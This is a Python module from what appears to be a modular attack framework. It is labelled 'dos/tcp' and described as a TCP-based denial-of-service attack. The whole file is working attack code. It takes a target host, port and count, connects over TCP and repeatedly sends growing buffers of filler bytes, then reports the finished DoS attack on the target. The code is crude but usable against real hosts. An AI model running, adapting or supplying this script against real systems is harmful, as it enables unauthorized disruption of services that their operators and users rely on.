import requests
from rich.console import Console
from rich.table import Table
from scapy.all import TCP
import socket
import random

class Module:
    def __init__(self, logger):
        self.logger = logger
        self.name = "dos/tcp"
        self.description = "TCP based dos attack."
        self.author = "Onur Atakan ULUSOY"        
        self.options = {
            "target": {"value": None, "required": True},
            "port": {"value": 80, "required": False},
            "amount": {"value": 1, "required": True},
        }

    def info(self):
        console = Console()
        table = Table()
        table.add_column("Name")
        table.add_column("Description")
        table.add_column("Author")
        table.add_row(self.name, self.description, self.author)
        console.print(table)


    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error(f"Required key {str(key)} is not set for {self.name}")
                return


        target = self.options["target"]["value"]
        port = int(self.options["port"]["value"])
        amount = int(self.options["amount"]["value"])

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        packet = ''
        # loop for continuous sending packets
        for i in range(amount):
            # randomize the length of the packets
            rand_length = random.randint(100, 500)
            # build the packets
            for i in range(1, rand_length):
                packet += 'A'
            # send the packets
            s.send(packet.encode())
        s.close()
        print(f"\033[32m[+]\033[0m Finished tcp_dos DoS attack on {target}-{port}")


